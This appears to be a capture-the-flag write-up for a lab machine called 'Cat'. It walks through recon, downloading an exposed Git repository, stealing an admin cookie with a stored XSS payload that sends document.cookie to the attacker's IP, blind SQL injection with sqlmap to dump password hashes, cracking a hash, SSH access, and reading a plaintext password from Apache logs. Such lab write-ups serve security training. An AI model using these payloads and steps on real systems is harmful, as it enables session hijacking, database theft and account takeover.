---
icon: desktop
hidden: true
noIndex: true
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Copy of Copy of Cat

<figure><img src="../../.gitbook/assets/Cat.png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance



```bash
❯ nmap -p- --open -sS --min-rate 1000 -Pn -n 10.10.11.53 -oG allPorts
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-02 23:39 CET
Nmap scan report for 10.10.11.53
Host is up (0.060s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.32 seconds
```





```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.53
	[*] Open ports: 22,80

[*] Ports copied to clipboard
```





```bash
❯ nmap -sCV -p22,80 10.10.11.53 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-02 23:42 CET
Nmap scan report for cat.htb (10.10.11.53)
Host is up (0.072s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 96:2d:f5:c6:f6:9f:59:60:e5:65:85:ab:49:e4:76:14 (RSA)
|   256 9e:c4:a4:40:e9:da:cc:62:d1:d6:5a:2f:9e:7b:d4:aa (ECDSA)
|_  256 6e:22:2a:6a:6d:eb:de:19:b7:16:97:c2:7e:89:29:d5 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-git: 
|   10.10.11.53:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Cat v1 
|_http-title: Best Cat Competition
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   64.13 ms 10.10.16.1
2   95.83 ms cat.htb (10.10.11.53)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.18 seconds
```





```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../.gitbook/assets/imagen (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



```bash
❯ cat /etc/hosts | grep 10.10.11.53
10.10.11.53 cat.htb
```



## Web Enumeration



<figure><img src="../../.gitbook/assets/imagen (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (5) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/imagen (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (6) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (7) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/imagen (8) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



### Attempting to upload a malicious PHP file



<figure><img src="../../.gitbook/assets/imagen (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



### Downloading Git Folder disclosure (GitHack)



```bash
❯ dirsearch -u 'http://cat.htb' -i 200 -t 50 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/kali/Desktop/HackTheBox/Linux/Cat/Cat/content/reports/http_cat.htb/_25-02-02_23-55-14.txt

Target: http://cat.htb/

[23:55:14] Starting: 
[23:55:19] 200 -   92B  - /.git/config
[23:55:19] 200 -   73B  - /.git/description
[23:55:19] 200 -    7B  - /.git/COMMIT_EDITMSG
[23:55:20] 200 -   23B  - /.git/HEAD
[23:55:20] 200 -    2KB - /.git/index
[23:55:20] 200 -  240B  - /.git/info/exclude
[23:55:20] 200 -  150B  - /.git/logs/refs/heads/master
[23:55:20] 200 -  150B  - /.git/logs/HEAD
[23:55:20] 200 -   41B  - /.git/refs/heads/master
```



```bash
❯ python3 /opt/GitHack/GitHack.py http://cat.htb/.git/ 2>/dev/null 
```



```bash
❯ tree
.
├── accept_cat.php
├── admin.php
├── config.php
├── contest.php
├── css
│   └── styles.css
├── delete_cat.php
├── img
│   ├── cat1.jpg
│   ├── cat2.png
│   └── cat3.webp
├── img_winners
│   ├── cat1.jpg
│   ├── cat2.png
│   └── cat3.webp
├── index.php
├── join.php
├── logout.php
├── view_cat.php
├── vote.php
├── winners
│   └── cat_report_20240831_173129.php
└── winners.php

5 directories, 19 files
```





{% code title="contest.php" %}
```php
<?php
session_start();

include 'config.php';

// Message variables
$success_message = "";
$error_message = "";

// Check if the user is logged in
if (!isset($_SESSION['username'])) {
    header("Location: /join.php");
    exit();
}

// Function to check for forbidden content
function contains_forbidden_content($input, $pattern) {
    return preg_match($pattern, $input);
}

// Check if the form has been submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Capture form data
    $cat_name = $_POST['cat_name'];
    $age = $_POST['age'];
    $birthdate = $_POST['birthdate'];
    $weight = $_POST['weight'];

    $forbidden_patterns = "/[+*{}',;<>()\\[\\]\\/\\:]/";

    // Check for forbidden content
    if (contains_forbidden_content($cat_name, $forbidden_patterns) ||
        contains_forbidden_content($age, $forbidden_patterns) ||
        contains_forbidden_content($birthdate, $forbidden_patterns) ||
        contains_forbidden_content($weight, $forbidden_patterns)) {
        $error_message = "Your entry contains invalid characters.";
    } else {
        // Generate unique identifier for the image
        $imageIdentifier = uniqid() . "_";

        // Upload cat photo
        $target_dir = "uploads/";
        $target_file = $target_dir . $imageIdentifier . basename($_FILES["cat_photo"]["name"]);
        $uploadOk = 1;
        $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

        // Check if the file is an actual image or a fake file
        $check = getimagesize($_FILES["cat_photo"]["tmp_name"]);
        if($check !== false) {
            $uploadOk = 1;
        } else {
            $error_message = "Error: The file is not an image.";
            $uploadOk = 0;
        }

        // Check if the file already exists
        if (file_exists($target_file)) {
            $error_message = "Error: The file already exists.";
            $uploadOk = 0;
        }

        // Check file size
        if ($_FILES["cat_photo"]["size"] > 500000) {
            $error_message = "Error: The file is too large.";
            $uploadOk = 0;
        }

        // Allow only certain file formats
        if($imageFileType != "jpg" && $imageFileType != "png" && $imageFileType != "jpeg") {
            $error_message = "Error: Only JPG, JPEG, and PNG files are allowed.";
            $uploadOk = 0;
        }

        // Check if $uploadOk is set to 0 by an error
        if ($uploadOk == 0) {
        } else {
            if (move_uploaded_file($_FILES["cat_photo"]["tmp_name"], $target_file)) {
                // Prepare SQL query to insert cat data
                $stmt = $pdo->prepare("INSERT INTO cats (cat_name, age, birthdate, weight, photo_path, owner_username) VALUES (:cat_name, :age, :birthdate, :weight, :photo_path, :owner_username)");
                // Bind parameters
                $stmt->bindParam(':cat_name', $cat_name, PDO::PARAM_STR);
                $stmt->bindParam(':age', $age, PDO::PARAM_INT);
                $stmt->bindParam(':birthdate', $birthdate, PDO::PARAM_STR);
                $stmt->bindParam(':weight', $weight, PDO::PARAM_STR);
                $stmt->bindParam(':photo_path', $target_file, PDO::PARAM_STR);
                $stmt->bindParam(':owner_username', $_SESSION['username'], PDO::PARAM_STR);
                // Execute query
                if ($stmt->execute()) {
                    $success_message = "Cat has been successfully sent for inspection.";
                } else {
                    $error_message = "Error: There was a problem registering the cat.";
                }
            } else {
                $error_message = "Error: There was a problem uploading the file.";
            }
        }
    }
}
?>
```
{% endcode %}





{% code title="admin.php" %}
```php
<?php
session_start();

include 'config.php';

// Check if the user is logged in
if (!isset($_SESSION['username']) || $_SESSION['username'] !== 'axel') {
    header("Location: /join.php");
    exit();
}

// Fetch cat data from the database
$stmt = $pdo->prepare("SELECT * FROM cats");
$stmt->execute();
$cats = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>
```
{% endcode %}



{% code title="config.php" %}
```php
<?php
// Database configuration
$db_file = '/databases/cat.db';

// Connect to the database
try {
    $pdo = new PDO("sqlite:$db_file");
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Error: " . $e->getMessage());
}
?>
```
{% endcode %}



{% code title="" %}
```php
<?php
session_start();

include 'config.php';

$success_message = "";
$error_message = "";

// Registration process
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['registerForm'])) {
    $username = $_GET['username'];
    $email = $_GET['email'];
    $password = md5($_GET['password']);

    $stmt_check = $pdo->prepare("SELECT * FROM users WHERE username = :username OR email = :email");
    $stmt_check->execute([':username' => $username, ':email' => $email]);
    $existing_user = $stmt_check->fetch(PDO::FETCH_ASSOC);

    if ($existing_user) {
        $error_message = "Error: Username or email already exists.";
    } else {
        $stmt_insert = $pdo->prepare("INSERT INTO users (username, email, password) VALUES (:username, :email, :password)");
        $stmt_insert->execute([':username' => $username, ':email' => $email, ':password' => $password]);

        if ($stmt_insert) {
            $success_message = "Registration successful!";
        } else {
            $error_message = "Error: Unable to register user.";
        }
    }
}

// Login process
if ($_SERVER["REQUEST_METHOD"] == "GET" && isset($_GET['loginForm'])) {
    $username = $_GET['loginUsername'];
    $password = md5($_GET['loginPassword']);

    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
    $stmt->execute([':username' => $username]);
    $user = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($user && $password === $user['password']) {
        $_SESSION['username'] = $user['username'];
        header("Location: /");
        exit();
    } else {
        $error_message = "Incorrect username or password.";
    }
}
?>
```
{% endcode %}



## Initial Foothold



### Performing Cookie Hijacking



<figure><img src="../../.gitbook/assets/imagen (285).png" alt=""><figcaption></figcaption></figure>



```javascript
<script>fetch("http://10.10.16.5/?value=" + document.cookie);</script> 
```

<figure><img src="../../.gitbook/assets/imagen (286).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (288).png" alt=""><figcaption></figcaption></figure>



```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```



<figure><img src="../../.gitbook/assets/imagen (289).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/imagen (290).png" alt=""><figcaption></figcaption></figure>





```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.53 - - [05/Feb/2025 01:31:56] "GET /?value=PHPSESSID=ojvduvoofuju8avf7cijqorq6g HTTP/1.1" 200 -
```



<figure><img src="../../.gitbook/assets/imagen (291).png" alt=""><figcaption></figcaption></figure>



### Executing SQL Injection Blind



<figure><img src="../../.gitbook/assets/imagen (292).png" alt=""><figcaption></figcaption></figure>



{% code title="view_cat.php" %}
```php
<?php
session_start();

include 'config.php';

// Check if the user is logged in
if (!isset($_SESSION['username']) || $_SESSION['username'] !== 'axel') {
    header("Location: /join.php");
    exit();
}

// Get the cat_id from the URL
$cat_id = isset($_GET['cat_id']) ? $_GET['cat_id'] : null;

if ($cat_id) {
    // Prepare and execute the query
    $query = "SELECT cats.*, users.username FROM cats JOIN users ON cats.owner_username = users.username WHERE cat_id = :cat_id";
    $statement = $pdo->prepare($query);
    $statement->bindParam(':cat_id', $cat_id, PDO::PARAM_INT);
    $statement->execute();

    // Fetch cat data from the database
    $cat = $statement->fetch(PDO::FETCH_ASSOC);

    if (!$cat) {
        die("Cat not found.");
    }
} else {
    die("Invalid cat ID.");
}
?>

```
{% endcode %}



{% code title="accept_cat.php" %}
```php
<?php
include 'config.php';
session_start();

if (isset($_SESSION['username']) && $_SESSION['username'] === 'axel') {
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        if (isset($_POST['catId']) && isset($_POST['catName'])) {
            $cat_name = $_POST['catName'];
            $catId = $_POST['catId'];
            $sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
            $pdo->exec($sql_insert);

            $stmt_delete = $pdo->prepare("DELETE FROM cats WHERE cat_id = :cat_id");
            $stmt_delete->bindParam(':cat_id', $catId, PDO::PARAM_INT);
            $stmt_delete->execute();

            echo "The cat has been accepted and added successfully.";
        } else {
            echo "Error: Cat ID or Cat Name not provided.";
        }
    } else {
        header("Location: /");
        exit();
    }
} else {
    echo "Access denied.";
}
?>
```
{% endcode %}





{% code title="delete_cat.php" %}
```php
<?php
include 'config.php';
session_start();

if (isset($_SESSION['username']) && $_SESSION['username'] == 'axel'){
 if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['catId'])) {
        $catId = $_POST['catId'];

        $stmt_select = $pdo->prepare("SELECT photo_path FROM cats WHERE cat_id = :cat_id");
        $stmt_select->bindParam(':cat_id', $catId, PDO::PARAM_INT);
        $stmt_select->execute();
        $cat = $stmt_select->fetch(PDO::FETCH_ASSOC);

        if ($cat) {
            $photo_path = $cat['photo_path'];

            $stmt_delete = $pdo->prepare("DELETE FROM cats WHERE cat_id = :cat_id");
            $stmt_delete->bindParam(':cat_id', $catId, PDO::PARAM_INT);
            $stmt_delete->execute();

            if (file_exists($photo_path)) {
                unlink($photo_path);
            }

            echo "The cat has been rejected and removed successfully.";
        } else {
            echo "Error: Cat not found.";
        }
    } else {
        echo "Error: Cat ID not provided.";
    }
 } else {
    header("Location: /");
    exit();
 }
 } else {
    echo "Access denied.";
 }
?>
```
{% endcode %}





<figure><img src="../../.gitbook/assets/imagen (293).png" alt=""><figcaption></figcaption></figure>



```bash
❯ cat request
POST /accept_cat.php HTTP/1.1
Host: cat.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Origin: http://cat.htb
Connection: keep-alive
Referer: http://cat.htb/admin.php
Cookie: PHPSESSID=ojvduvoofuju8avf7cijqorq6g 
Sec-GPC: 1
Priority: u=0

catName=GzzcooCat&catId=1
```







```bash
❯ sqlmap -r request -p catName --dbms sqlite --level 5 --risk 3 --technique=BEST --tables
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:32:39 /2025-02-05/

[02:32:39] [INFO] parsing HTTP request from 'request'
[02:32:39] [INFO] testing connection to the target URL
[02:32:39] [INFO] testing if the target URL content is stable
[02:32:40] [INFO] target URL content is stable
[02:32:40] [WARNING] heuristic (basic) test shows that POST parameter 'catName' might not be injectable
[02:32:40] [INFO] testing for SQL injection on POST parameter 'catName'
[02:32:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[02:32:48] [INFO] POST parameter 'catName' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
[02:32:48] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
[02:32:48] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
[02:32:48] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
[02:32:56] [INFO] POST parameter 'catName' appears to be 'SQLite > 2.0 AND time-based blind (heavy query)' injectable 
[02:32:56] [INFO] checking if the injection point on POST parameter 'catName' is a false positive
POST parameter 'catName' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 82 HTTP(s) requests:
---
Parameter: catName (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: catName=GzzcooCat'||(SELECT CHAR(122,97,113,98) WHERE 6534=6534 AND 9558=9558)||'&catId=1

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: catName=GzzcooCat'||(SELECT CHAR(104,76,97,65) WHERE 6505=6505 AND 6068=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||'&catId=1
---
[02:33:07] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: SQLite
[02:33:07] [INFO] fetching tables for database: 'SQLite_masterdb'
[02:33:07] [INFO] fetching number of tables for database 'SQLite_masterdb'
[02:33:07] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[02:33:07] [INFO] retrieved: 4
[02:33:07] [INFO] retrieved: accepted_cats
[02:33:20] [INFO] retrieved: sqlite_sequence
[02:33:35] [INFO] retrieved: cats
[02:33:39] [INFO] retrieved: users
<current>
[4 tables]
+-----------------+
| accepted_cats   |
| cats            |
| sqlite_sequence |
| users           |
+-----------------+

[02:33:44] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 184 times
[02:33:44] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/cat.htb'

[*] ending @ 02:33:44 /2025-02-05/
```



```bash
❯ sqlmap -r request -p catName --dbms sqlite --level 5 --risk 3 --technique=BEST -T users --columns
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.9#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:35:21 /2025-02-05/

[02:35:21] [INFO] parsing HTTP request from 'request'
[02:35:21] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: catName (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: catName=GzzcooCat'||(SELECT CHAR(122,97,113,98) WHERE 6534=6534 AND 9558=9558)||'&catId=1

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: catName=GzzcooCat'||(SELECT CHAR(104,76,97,65) WHERE 6505=6505 AND 6068=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||'&catId=1
---
[02:35:21] [INFO] testing SQLite
[02:35:21] [INFO] confirming SQLite
[02:35:21] [INFO] actively fingerprinting SQLite
[02:35:21] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu 19.10 or 20.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: SQLite
[02:35:21] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[02:35:21] [INFO] retrieved: CREATE TABLE users (     user_id INTEGER PRIMARY KEY,     username VARCHAR(255) NOT NULL,     email VARCHAR(255) NOT NULL,     password VARCHAR(255) NOT NULL )
Database: <current>
Table: users
[4 columns]
+----------+---------+
| Column   | Type    |
+----------+---------+
| email    | VARCHAR |
| password | VARCHAR |
| user_id  | INTEGER |
| username | VARCHAR |
+----------+---------+

[02:38:11] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 592 times
[02:38:11] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/cat.htb'

[*] ending @ 02:38:11 /2025-02-05/

```



```bash
❯ sqlmap -r request -p catName --dbms sqlite --level 5 --risk 3 --technique=BEST -T users -C username,password --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:49:52 /2025-02-05/

[02:49:52] [INFO] parsing HTTP request from 'request'
[02:49:52] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: catName (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: catName=GzzcooCat'||(SELECT CHAR(122,97,113,98) WHERE 6534=6534 AND 9558=9558)||'&catId=1

    Type: time-based blind
    Title: SQLite > 2.0 AND time-based blind (heavy query)
    Payload: catName=GzzcooCat'||(SELECT CHAR(104,76,97,65) WHERE 6505=6505 AND 6068=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||'&catId=1
---
[02:49:52] [INFO] testing SQLite
[02:49:52] [INFO] confirming SQLite
[02:49:52] [INFO] actively fingerprinting SQLite
[02:49:52] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu 20.04 or 20.10 or 19.10 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: SQLite
[02:49:52] [INFO] fetching entries of column(s) 'password,username' for table 'users'
[02:49:52] [INFO] fetching number of column(s) 'password,username' entries for table 'users' in database 'SQLite_masterdb'
[02:49:52] [INFO] resumed: 11
[02:49:52] [INFO] resumed: d1bbba3670febH
[02:49:52] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[02:49:52] [INFO] retrieved: axel
[02:49:56] [INFO] retrieved: ac369922d560f17d6eeb8b2c7dec498c
[02:50:31] [INFO] retrieved: rosa
[02:50:35] [INFO] retrieved: 42846631708f69c00ec0c0a8aa4a92ad
[02:51:12] [INFO] retrieved: robert
[02:51:18] [INFO] retrieved: 39e153e825c4a3d314a0dc7f7475ddbe
[02:51:53] [INFO] retrieved: fabian
[02:51:59] [INFO] retrieved: 781593e060f8d065cd7281c5ec5b4b86
[02:52:35] [INFO] retrieved: jerryson
[02:52:43] [INFO] retrieved: 1b6dce240bbfbc0905a664ad199e18f8
[02:53:19] [INFO] retrieved: larry
[02:53:24] [INFO] retrieved: c598f6b844a36fa7836fba0835f1f6
[02:53:59] [INFO] retrieved: royer
[02:54:04] [INFO] retrieved: e41ccefa439fc454f7eadbf1f139ed8a
[02:54:40] [INFO] retrieved: peter
[02:54:45] [INFO] retrieved: 24a8ec003ac2e1b3c5953a6f95f8f565
[02:55:21] [INFO] retrieved: angel
[02:55:27] [INFO] retrieved: 88e4dceccd48820cf77b5cf6c08698ad
[02:56:01] [INFO] retrieved: jobert
[02:56:07] [INFO] retrieved: c0875f003f521ed64586f6c8e6c34745
[02:56:45] [INFO] retrieved: <script>fetch("http://10.10.16.5/?value=" + document.cookie);</script> 
[02:57:56] [INFO] recognized possible password hashes in column 'password'
Database: <current>
Table: users
[11 entries]
+-------------------------------------------------------------------------+----------------------------------+
| username                                                                | password                         |
+-------------------------------------------------------------------------+----------------------------------+
| axel                                                                    | d1bbba3670febH                   |
| rosa                                                                    | ac369922d560f17d6eeb8b2c7dec498c |
| robert                                                                  | 42846631708f69c00ec0c0a8aa4a92ad |
| fabian                                                                  | 39e153e825c4a3d314a0dc7f7475ddbe |
| jerryson                                                                | 781593e060f8d065cd7281c5ec5b4b86 |
| larry                                                                   | 1b6dce240bbfbc0905a664ad199e18f8 |
| royer                                                                   | c598f6b844a36fa7836fba0835f1f6   |
| peter                                                                   | e41ccefa439fc454f7eadbf1f139ed8a |
| angel                                                                   | 24a8ec003ac2e1b3c5953a6f95f8f565 |
| jobert                                                                  | 88e4dceccd48820cf77b5cf6c08698ad |
| <script>fetch("http://10.10.16.5/?value=" + document.cookie);</script>  | c0875f003f521ed64586f6c8e6c34745 |
+-------------------------------------------------------------------------+----------------------------------+

[02:59:56] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/cat.htb/dump/SQLite_masterdb/users.csv'
[02:59:56] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1666 times
[02:59:56] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/cat.htb'
```



### Cracking hashes



```bash
❯ hashcat -a 0 -m 0 hashes /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 2913/5891 MB (1024 MB allocatable), 8MCU


ac369922d560f17d6eeb8b2c7dec498c:soyunaprincesarosa
```



### Access via SSH with newly cracked password&#x20;

```bash
❯ ssh rosa@cat.htb
The authenticity of host 'cat.htb (10.10.11.53)' can't be established.
ED25519 key fingerprint is SHA256:tsmOV3JuQkCv6HNUqg9YQ+DJznLS2nYKJl4zIwKtbE4.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:22: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cat.htb' (ED25519) to the list of known hosts.
rosa@cat.htb's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-204-generic x86_64)


Last login: Sat Sep 28 15:44:52 2024 from 192.168.1.64
rosa@cat:~$
```



## Initial Access





### Abusing adm group to see disclosure of sensitive data in logs



```bash
rosa@cat:~$ id
uid=1001(rosa) gid=1001(rosa) groups=1001(rosa),4(adm)
```



{% embed url="https://wiki.debian.org/SystemGroups" %}

<figure><img src="../../.gitbook/assets/imagen (294).png" alt=""><figcaption></figcaption></figure>



```bash
rosa@cat:/var/log$ ls -l | grep adm
drwxr-x---  2 root      adm                4096 Feb  5 01:27 apache2
drwxr-x---  2 root      adm                4096 Jan 31 11:17 audit
-rw-r-----  1 syslog    adm               17809 Feb  5 02:10 auth.log
-rw-r-----  1 syslog    adm               19344 Jan 30 15:33 auth.log.1
-rw-r-----  1 syslog    adm                   1 Jan 21 13:02 cloud-init.log
-rw-r-----  1 root      adm              282216 Dec 31 12:27 cloud-init-output.log
-rw-r--r--  1 root      adm                   0 Jan 21 13:01 dmesg
drwxr-x---  3 root      adm                4096 Jun  3  2024 installer
-rw-r-----  1 syslog    adm              653250 Feb  5 01:27 kern.log
-rw-r-----  1 syslog    adm             1051746 Jan 30 15:33 kern.log.1
-rw-r-----  1 syslog    adm               21345 Feb  5 02:10 mail.log
-rw-r-----  1 syslog    adm                4565 Jan 27 16:05 mail.log.1
-rw-r-----  1 syslog    adm               29335 Feb  5 02:10 syslog
-rw-r-----  1 syslog    adm              251510 Feb  5 01:27 syslog.1
-rw-r-----  1 syslog    adm              131116 Jan 31 11:17 syslog.2.gz
```





```bash
rosa@cat:/var/log/apache2$ ls -l
total 2472
-rw-r----- 1 root adm 1239128 Feb  5 02:11 access.log
-rw-r----- 1 root adm  185192 Jan 31 11:48 access.log.1
-rw-r----- 1 root adm     724 Jan 30 15:40 access.log.2.gz
-rw-r----- 1 root adm 1077499 Feb  5 01:59 error.log
-rw-r----- 1 root adm     346 Jan 31 11:48 error.log.1
-rw-r----- 1 root adm     351 Jan 30 15:40 error.log.2.gz
-rw-r----- 1 root adm       0 Jan 21 12:34 other_vhosts_access.log
```



```bash
rosa@cat:/var/log/apache2$ cat access.log | grep -iE "login|password|pass|username|user" | head -n 10
127.0.0.1 - - [05/Feb/2025:01:27:18 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
127.0.0.1 - - [05/Feb/2025:01:27:29 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
127.0.0.1 - - [05/Feb/2025:01:27:40 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
127.0.0.1 - - [05/Feb/2025:01:27:50 +0000] "GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q&loginForm=Login HTTP/1.1" 302 329 "http://cat.htb/join.php" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0"
